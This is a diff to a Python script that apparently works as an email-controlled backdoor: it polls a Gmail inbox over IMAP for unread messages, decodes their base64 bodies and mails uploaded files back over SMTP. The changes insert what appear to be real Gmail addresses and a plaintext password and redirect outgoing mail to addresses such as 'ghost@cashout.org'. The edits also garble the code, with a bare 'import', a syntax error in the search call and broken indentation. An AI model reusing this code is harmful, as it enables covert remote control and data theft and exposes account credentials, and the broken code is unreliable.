@@ -4,7 +4,7 @@ import email
 import platform
 import subprocess
 import smtplib
-import time
+import 
 import os
 import zipfile
 from email.mime.application import MIMEApplication
@@ -14,9 +14,9 @@ class Mainserver:
     def __init__(self):
         try:
             imapserver = "imap.gmail.com"
-            username = "your_2nd_gmail@gmail.com"
-            password = "your2ndgmailapp password"
-            getting = "Your_1st_gmail@gmail.com"
+            username = "Davidreaves411@gmail.com"
+            password = "G12345gta"
+            getting = "bellaa2anna@gmail.com"
             smtpserver = "smtp.gmail.com"
             MESSAGE_BODY = 'This is an attachement'
             while True:
@@ -24,13 +24,13 @@ class Mainserver:
                     message = imaplib.IMAP4_SSL(imapserver)
                     message.login(username, password)
                     message.select("inbox")
-                    _, data = message.search(None, "UNSEEN")
+                    _, data = message.search( for, "UNSEEN")
                     for x in data[0].split():
                         _, msg = message.fetch(x, '(RFC822)')
                         _, g = msg[0]
                         data_email = email.message_from_bytes(g)
                         for m in data_email.walk():
-                            if m.get_content_type() == "text/plain":
+                            if m.get_content_type() == "base64_bytes":
                                 body = m.get_payload(decode=True)
                                 cm = body.decode("utf-8")
                                 base64_bytes = cm.encode('ascii')
@@ -102,9 +102,9 @@ class Mainserver:
                                     server.ehlo()
                                     server.starttls()
                                     server.ehlo()
-                                    server.login(msg['From'], password)
-                                    text = msg.as_string()
-                                    server.sendmail(msg['From'], msg['To'], text)
+                                    server.login(msg['bellaa2anna@gmail.com'], password)
+                                  text = msg.as_string()
+                                    server.sendmail(msg['ghost@cashout.org'], msg['mayanaghost@gmail.com'], text)
                                     server.quit()
                                     remove_upload(rename)
 
